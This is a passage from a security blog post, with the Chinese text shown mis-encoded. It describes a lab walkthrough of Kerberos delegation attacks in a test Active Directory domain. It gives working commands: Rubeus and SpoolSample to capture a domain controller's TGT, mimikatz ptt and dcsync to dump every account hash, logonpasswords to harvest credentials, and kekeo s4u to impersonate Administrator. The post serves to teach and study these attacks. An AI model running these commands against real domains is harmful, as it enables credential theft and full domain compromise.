<h2 id="æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰"><a href="#æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰" class="headerlink" title="æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰"></a>æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰</h2><p>ä¸Šé¢åˆ©ç”¨éçº¦æŸå§”æ´¾æ‹¿åˆ°åŸŸç®¡è´¦æˆ·TGTçš„å‰ææ˜¯éœ€è¦åŸŸç®¡è´¦æˆ·å’Œå§”æ´¾ä¸»æœºæœ‰è¿‡äº¤äº’æ‰èƒ½è·å–åˆ°TGTã€‚å½“åŸŸæ§æœºå™¨å¼€å¯Print SpooleræœåŠ¡æ—¶(é»˜è®¤å¼€å¯ä¸”ä»¥Systemæƒé™è¿è¡Œ)ï¼Œæ”»å‡»è€…å¯ä»¥ä¸»åŠ¨è¦æ±‚åŸŸæ§è®¿é—®å·²è¢«æ”»å‡»è€…æ§åˆ¶çš„éå—é™å§”æ´¾æœåŠ¡å™¨ï¼Œè¿›è€Œè·å–åŸŸæ§ä¸»æœºè´¦æˆ·çš„TGTã€‚å½“ç„¶è¿™ç§æ”»å‡»æ–¹å¼ä¹Ÿé€‚ç”¨äºå…¶ä»–éåŸŸæ§æœºå™¨ã€‚<strong>ä½†æ˜¯è¿™ç§æ”»å‡»æœ‰ä¸€ä¸ªé™åˆ¶æ˜¯éœ€è¦æ‰¾åˆ°ä¸€å°å¼€å¯éå—é™å§”æ´¾çš„ä¸»æœºè´¦æˆ·ï¼Œè€ŒéæœåŠ¡è´¦æˆ·å¹¶ä¸”æœ‰ä¸€ä¸ªåŸŸæ™®é€šè´¦æˆ·</strong></p>
<p><img src="./1570777540500.png" alt="Alt text"></p>
<p>å®Œæˆè¿™ä¸€å¥—æ”»å‡»éœ€è¦ä¸¤ä¸ª<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>å’Œ<a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>çš„å·¥å…·ï¼ŒRubeuså¯ä»¥çœ‹ä½œå¯¹kekeoçš„å¼¥è¡¥ï¼ŒSpoolSampleç”¨æˆ·å‘DC2 Print Spoolerå‘èµ·è¯·æ±‚ã€‚SpoolSampleè²Œä¼¼åªèƒ½ç”¨.net4.0ä»¥ä¸Šçš„ç‰ˆæœ¬ç¼–è¯‘ï¼Œæ‰€ä»¥è¿™æ¬¡å°±åœ¨win10ä¸Šç”¨äº†ã€‚<br>æœ¬åœ°ç®¡ç†å‘˜è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:WIN-PMID8H9A6H0$</span><br></pre></td></tr></table></figure>
<p><img src="./1570850050489.png" alt="Alt text"></p>
<p>åŸŸæ™®é€šè´¦æˆ·è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe WIN-PMID8H9A6H0 database2</span><br></pre></td></tr></table></figure>
<p><img src="./1570850068279.png" alt="Alt text"><br>å›°æƒ‘çš„æ˜¯è¿™é‡ŒæŠ¥é”™äº†ï¼ŒæŸ¥äº†æŠ¥é”™ç è¯´æ˜¯Print Spooleræ²¡å¼€ï¼Œä½†æ˜¯æ˜æ˜å¼€äº†çš„ã€‚ã€‚ã€‚<br>ä¸è¿‡å³°å›è·¯è½¬çš„æ˜¯database2 ä¸Šå¯ä»¥æŠ“åˆ°åŸŸæ§ä¼ æ¥çš„tgt<br><img src="./1570868278901.png" alt="Alt text"><br><img src="./1570868800619.png" alt="Alt text"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;a8543]-2-0-60a10000-WIN-PMID8H9A6H0$@krbtgt-BETA.COM.kirbi</span><br><span class="line">lsadump::dcsync &#x2F;domain:beta.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>
<p><img src="./1570871508561.png" alt="Alt text"></p>
<h2 id="æ”»å‡»çº¦æŸå§”æ´¾"><a href="#æ”»å‡»çº¦æŸå§”æ´¾" class="headerlink" title="æ”»å‡»çº¦æŸå§”æ´¾"></a>æ”»å‡»çº¦æŸå§”æ´¾</h2><p>åŸŸæ§ä¸Šè¿™ä¹ˆé…ç½®<br><img src="./1570713945685.png" alt="Alt text"></p>
<p>åœ¨database2ä¸Šç”¨mimikatzæŠ“å–ä¸»æœºè´¦æˆ·htlm hashï¼ˆä¸»æœºè´¦æˆ·å³hostname$ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
<p><img src="./1570701745743.png" alt="Alt text"></p>
<p>ç”¨æ‹¿åˆ°çš„ntlm hashç”³è¯·tgt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:database2$ &#x2F;domain:beta.com &#x2F;ntlm:65118c9246cada2aa3e1a366f3ed06cf</span><br></pre></td></tr></table></figure>
<p><img src="./1570702323339.png" alt="Alt text"></p>
<p><em>psï¼šå…¶å®æŠ“hashå’Œkekeoçš„æ“ä½œåœ¨æ‹¥æœ‰database2ä¸»æœºæƒé™ä¸‹éƒ½æ˜¯å¤šä½™çš„æ“ä½œã€‚è¿™é‡Œä¸ºäº†å®Œæ•´æ€§å†™å‡ºæ¥ï¼Œå…¶å®é™…æ„ä¹‰åœ¨äºåœ¨å®æˆ˜ä¸­é€šè¿‡å…¶ä»–æ–¹å¼ä¾‹å¦‚çˆ†ç ´è·å–äº†æœåŠ¡è´¦å·çš„å¯†ç ï¼ˆæœåŠ¡è´¦å·çš„å¯†ç æ˜¯ç®¡ç†å‘˜è‡ªå·±è®¾ç½®æ‰€ä»¥å¯èƒ½æ˜¯å¼±å£ä»¤ï¼Œè‡³äºä¸»æœºè´¦æˆ·çš„å¯†ç ä¸Šä¸Šå¼ å›¾ä½ ä¹Ÿçœ‹åˆ°äº†é•¿çš„è¿‡åˆ†ï¼‰çš„æƒ…å†µä¸‹è¿›è¡Œçº¦æŸå§”æ´¾æ”»å‡»ã€‚</em></p>
<p>è·å–è®¿é—®exchange cifsæœåŠ¡çš„tgsï¼ˆtgsæ˜¯åŸŸç®¡æƒé™ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u &#x2F;tgt:TGT_database2$@BETA.COM_krbtgt~beta.com@BETA.COM.kirbi &#x2F;user:Administrator@beta.com &#x2F;service:cifs&#x2F;exchange.beta.com</span><br></pre></td></tr></table></figure>
<p><img src="./1570702415606.png" alt="Alt text"></p>
<p>å°†tgså¯¼å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@beta.com@BETA.COM_cifs~exchange.beta.com@BETA.COM.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="./1570702431480.png" alt="Alt text"></p>
<p>ä»¥æœ¬åœ°ç®¡ç†å‘˜èº«ä»½å‡è£…åŸŸç®¡è®¿é—®exchange smb<br><img src="./1570702480513.png" alt="Alt text"></p>
<h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><ul>
<li>é»˜è®¤æƒ…å†µä¸‹æ™®é€šåŸŸç”¨æˆ·åªèƒ½ç™»é™†åŸŸä¸­çš„PCä¸èƒ½ç™»é™†åŸŸä¸­server</li>
<li>tgtä½¿ç”¨ä¸åŸŸè´¦å·æ— å…³ï¼Œæœ¬åœ°è´¦æˆ·ä»ç„¶å¯ä»¥ä½¿ç”¨tgt</li>
<li>tgtæ˜¯ä»æœ¬è´¨æ¥è¯´æ˜¯krbtgtæœåŠ¡çš„tgs</li>
</ul>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.html">åŸŸæ¸—é€-Delegation</a><br><a href="http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/">åˆ©ç”¨èµ„æºçº¦æŸå§”æ´¾è¿›è¡Œçš„ææƒæ”»å‡»åˆ†æ</a><br><a href="https://paper.seebug.org/620/">åˆ©ç”¨ Kerberos delegation æ‰“é€ å˜ç§é»„é‡‘ç¥¨æ®</a><br><a href="https://pathowe.co.uk/delegation-between-servers-windows-authenticated-sites/">Setting up delegation between servers for Windows authenticated sites</a><br><a href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a><br><a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md">N1CTF 2019 Pentest N1ctf2019.lab WP</a><br><a href="https://blogs.msdn.microsoft.com/apgcdsd/2011/09/26/kerberosntlm-sql-server/">Kerberoså’ŒNTLM â€“ SQL Serverè¿æ¥çš„é‚£ç‚¹äº‹</a><br><a href="https://blog.csdn.net/yxwmzouzou/article/details/79002677">SQL Server åªå®‰è£…å®¢æˆ·ç«¯çš„æ–¹æ³•</a></p>
</div><div class="article-tags size-small mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/kerberos/">kerberos</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/10/18/thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97gadget%20%E5%A4%8D%E7%8E%B0/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">thinkphp ååºåˆ—åŒ–ç³»åˆ—gadget å¤ç°</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/10/09/s2-001%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"><span class="level-item">s2-001 ä»£ç åˆ†æ</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/logo.png" alt="æä¸‰çš„å‰‘è°±"></figure><p class="title is-size-4 is-block line-height-inherit">æä¸‰çš„å‰‘è°±</p><p class="is-size-6 is-block">æ”»/javaå®‰å…¨ç ”ç©¶/è‡ªåŠ¨åŒ–ä»£ç å®¡è®¡</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">44</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">15</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/cL0und" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/cL0und"><i class="fab fa-github"></i></a></div></div></div><div class="card widget" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="is-flex" href="#ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹"><span class="mr-2">1</span><span>ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹</span></a></li><li><a class="is-flex" href="#å§”æ´¾çš„åœºæ™¯"><span class="mr-2">2</span><span>å§”æ´¾çš„åœºæ™¯</span></a></li><li><a class="is-flex" href="#kerberoså§”æ´¾åˆ†ç±»"><span class="mr-2">3</span><span>kerberoså§”æ´¾åˆ†ç±»</span></a></li><li><a class="is-flex" href="#éçº¦æŸå§”æ´¾ï¼ˆUnconstrained-delegationï¼‰"><span class="mr-2">4</span><span>éçº¦æŸå§”æ´¾ï¼ˆUnconstrained delegationï¼‰</span></a></li><li><a class="is-flex" href="#çº¦æŸå§”æ´¾"><span class="mr-2">5</span><span>çº¦æŸå§”æ´¾</span></a><ul class="menu-list"><li><a class="is-flex" href="#ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾"><span class="mr-2">5.1</span><span>ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾</span></a></li><li><a class="is-flex" href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><span class="mr-2">5.2</span><span>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</span></a></li></ul></li><li><a class="is-flex" href="#å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·"><span class="mr-2">6</span><span>å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·</span></a></li><li><a class="is-flex" href="#ç¯å¢ƒè¯´æ˜"><span class="mr-2">7</span><span>ç¯å¢ƒè¯´æ˜</span></a></li><li><a class="is-flex" href="#æ”»å‡»éçº¦æŸå§”æ´¾"><span class="mr-2">8</span><span>æ”»å‡»éçº¦æŸå§”æ´¾</span></a></li><li><a class="is-flex" href="#æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰"><span class="mr-2">9</span><span>æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰</span></a></li><li><a class="is-flex" href="#æ”»å‡»çº¦æŸå§”æ´¾"><span class="mr-2">10</span><span>æ”»å‡»çº¦æŸå§”æ´¾</span></a></li><li><a class="is-flex" href="#æ‚"><span class="mr-2">11</span><span>æ‚</span></a></li><li><a class="is-flex" href="#å‚è€ƒ"><span class="mr-2">12</span><span>å‚è€ƒ</span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://7o8v.me/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">7o8vâ˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">7o8v.me</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://evoa.me/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">evoAâ˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">evoa.me</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://kkdlong.win/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">kkdlongâ˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">kkdlong.win</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://blog.l0ca1.xyz/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">l0calâ˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">blog.l0ca1.xyz</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://www.lmxspace.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">l1nk3r</span></span><span class="level-right"><span class="level-item tag">www.lmxspace.com</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://www.cnblogs.com/iamstudy/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">l3m0nâ˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">www.cnblogs.com</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://8sec.cc/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">è£¤è¡©å“¥çš„å°å±‹</span></span><span class="level-right"><span class="level-item tag">8sec.cc</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://abcdefghijklmnopqrst.xyz/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">éª‘éº¦å…œçœ‹è½æ—¥â˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">abcdefghijklmnopqrst.xyz</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://ph0rse.me/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">ph0rse</span></span><span class="level-right"><span class="level-item tag">ph0rse.me</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://godot.win/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">godotâ˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">godot.win</span></span></a></li><li><a class="level is-mobile is-mobile" href="http://hebic.me/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">ğŸ°å¸ˆå‚…â˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">hebic.me</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://jayl1n.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Jaylinï¼ˆå¤§æ½˜ï¼‰â˜˜ï¸</span></span><span class="level-right"><span class="level-item tag">jayl1n.github.io</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/ad-security/"><span class="level-start"><span class="level-item">ad security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/binary/"><span class="level-start"><span class="level-item">binary</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/redteam-trick/"><span class="level-start"><span class="level-item">redteam trick</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web-security/"><span class="level-start"><span class="level-item">web security</span></span><span class="level-end"><span class="level-item tag">33</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/windows-security/"><span class="level-start"><span class="level-item">windows security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2024-08-11T13:02:28.000Z">2024-08-11</time></p><p class="title is-6"><a class="link-muted" href="/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/">PWN å †åˆ©ç”¨ off-by-one NULL byte - b00ks writeup</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/binary/">binary</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2024-08-11T08:44:49.000Z">2024-08-11</time></p><p class="title is-6"><a class="link-muted" href="/2024/08/11/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/">åšå®¢é‡å¯å°è®°ï¼ˆ2ï¼‰</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2022-04-08T02:19:00.000Z">2022-04-08</time></p><p class="title is-6"><a class="link-muted" href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/">è®°ä¸€æ¬¡å¤±è´¥çš„Weblogic IIOP GadgetæŒ–æ˜</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/web-security/">web security</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2021-08-31T12:56:13.000Z">2021-08-31</time></p><p class="title is-6"><a class="link-muted" href="/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/">Two Tricks Of CAS-CLIENT AUTH Bypass</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/web-security/">web security</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2021-08-31T12:26:16.000Z">2021-08-31</time></p><p class="title is-6"><a class="link-muted" href="/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/">How Did I Find Weblogic T3 RCE</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/web-security/">web security</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2024/08/"><span class="level-start"><span class="level-item">August 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/12/"><span class="level-start"><span class="level-item">December 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/11/"><span class="level-start"><span class="level-item">November 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/10/"><span class="level-start"><span class="level-item">October 2019</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/09/"><span class="level-start"><span class="level-item">September 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2018/06/"><span class="level-start"><span class="level-item">June 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2018/04/"><span class="level-start"><span class="level-item">April 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2018/01/"><span class="level-start"><span class="level-item">January 2018</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2017/10/"><span class="level-start"><span class="level-item">October 2017</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2017/09/"><span class="level-start"><span class="level-item">September 2017</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2017/08/"><span class="level-start"><span class="level-item">August 2017</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cobaltstrike/"><span class="tag">cobaltstrike</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag is-grey-lightest">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/js/"><span class="tag">js</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kerberos/"><span class="tag">kerberos</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag is-grey-lightest">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql/"><span class="tag">sql</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web-cache/"><span class="tag">web cache</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9D%82/"><span class="tag">æ‚</span><span class="tag is-grey-lightest">2</span></a></div></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe to Updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="æä¸‰çš„å‰‘è°±" height="28"></a><p class="size-small"><span>&copy; 2024 æä¸‰ï¼ˆcl0undï¼‰</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'https://cl0und.github.io',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>